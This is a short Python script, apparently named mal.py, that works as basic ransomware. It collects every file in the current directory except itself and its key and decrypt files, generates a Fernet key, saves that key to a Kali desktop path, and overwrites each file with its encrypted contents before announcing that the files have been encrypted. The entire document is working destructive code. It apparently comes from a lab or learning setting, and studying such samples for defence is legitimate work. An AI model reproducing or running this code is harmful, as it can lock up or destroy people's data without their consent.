#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "mal.py" or file == "thekey.key" or file == "decrypt.py": #the file thekey.key only needs to be excluded if the path of the file is in the same directory
		continue

	if os.path.isfile(file):
		files.append(file)
print(files)


#key generation
key = Fernet.generate_key()

#change the path as desired
with open("/home/kali/Desktop/thekey.key", "wb") as thekey:
	thekey.write(key)


for file in files:
	with open(file, "rb") as thefile:
		content = thefile.read()
	content_encrypted = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encrypted)



print("All of your file has been encrypted!")
